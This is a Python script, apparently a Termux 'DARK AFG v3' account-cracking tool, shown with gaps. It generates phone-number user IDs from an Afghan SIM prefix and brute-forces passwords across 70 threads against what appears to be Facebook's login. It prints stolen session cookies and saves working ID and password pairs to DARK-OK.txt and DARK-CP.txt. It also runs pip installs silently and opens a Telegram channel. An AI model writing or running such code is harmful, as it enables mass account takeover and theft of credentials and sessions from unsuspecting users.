...
try:
    ...
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python run.py')
print('\n\033[1;32m[🌺] JOIN MY TELEGRAM CHANNEL');time.sleep(2)
os.system('xdg-open https://t.me/TermuxScriptDark')
os.system('clear')
print('\n\n\033[1;36m[🔥] WELCOME TO DARK AFG v3 TOOL\n\033[1;32m[🍁] Connecting Proxy...');time.sleep(3)
...
my_color = [
 P, M, H, K, B, U, O, N,BB,BM,BH,BP]
Dark = random.choice(my_color)
try:
...
try:
    ...
    print('\x1b[1;91m[🍁] INTERNAL ERROR...')
#    sys.exit()
...
try:
    ...
    print('\x1b[1;93m[🍁] CHEAKING SERVER...')
...
def clear():
	clr('clear')
	print(logo)
	print('\033[1;35m "━━━━━━━━━━": "━━━━━━━━━━━",\n \033[1;34m"𝙰𝚞𝚝𝚑𝚘𝚛": "FORID",\n "𝙶𝚒𝚝𝙷𝚞𝚋": "FORID-404",\n "𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖": "Unknown Team",\n\033[1;35m "━━━━━━━━━━": "━━━━━━━━━━━" ')
	linex()
...
def LIMON():
	clear()
	print(" \033[1;34m[01] RONDOM AFG CLONE")
	print(" \033[1;35m[02] JOIN TELEGRAM ")
	print(" \033[1;31m[03] EXIT TOOL")
	linex()
	option=input(f' {B} [{Dark}+{B}] CHOICE\033[1;32m : ')
	if option in ['01','1']:
		AFG_CLONING()
	elif option in ['02','2']:
		os.system('xdg-open https://t.me/TermuxScriptDark')
		...
		exit('\nTnx For Using DARK Tool')
	else:
		os.system('clear')
		print(1000*"\033[1;31mInvalid Option")
		time.sleep(2)
		LIMON()
#--------------AFG CLONE----------------#
...
def AFG_CLONING():
    ...
    print(logo)
    linex()
    print(' \033[1;35mEXAMPLE AFG CODE : \033[1;32m9378 / 9377 / 9379 / 9374 ')
    linex()
    kode = input(f' {B} [{Dark}+{B}] CHOICE CODE\033[1;32m : ')
    linex()
    os.system('clear')
    print(logo)
    linex()
    print(' \033[1;35mEXAMPLE LIMIT : \033[1;32m1000/2000/5000/10000/')
    linex()
    limit = int(input(f' {B} [{Dark}+{B}] CHOICE LIMIT\033[1;32m : '))
    linex()
    ...
    with ThreadPool(max_workers=70) as Aryan:
        ...
        linex()
        tl = str(len(user))
        print(' \033[1;34mCRACKING SIM CODE :\x1b[1;95m '+kode)
        print(' \033[1;34mCRACKING AMOUNT   :\x1b[1;95m '+tl)
        print(' \033[1;34mIDz SAVED IN - \x1b[1;95mDARL-OK.txt/DARK-CP.txt')
        print('\x1b[1;92m Cracking Proccess Running In Background...')
        linex()
        for guru in user:
            uid = kode+guru
    ...
    linex()
    print(' \033[1;34m[✓] CRACKING PROCESS HAS BEEN COMPLETED')
    input('\n\033[1;35m [-] PRESS ENTER TO BACK DARK AFG v3')
    LIMON()
#----------def crack----------------#
        ...
        for ps in pwx:
           ...
           # 'user-agent': pro,
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print(f'{Dark}[1;32m[DARK-OK] '+cid+' | '+ps+'\033[0;97m')
                print(f'{Dark}[‎‎🌺]\033[0;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m')
                linex()
                open('DARK-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print(f'{Dark}\033[1;31m[DARK-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('DARK-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;96m[DARK\033[1;97m]\033[1;92m %s \033[1;36m|\33[1;34m [OK-JustNow]\033[1;32m - %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
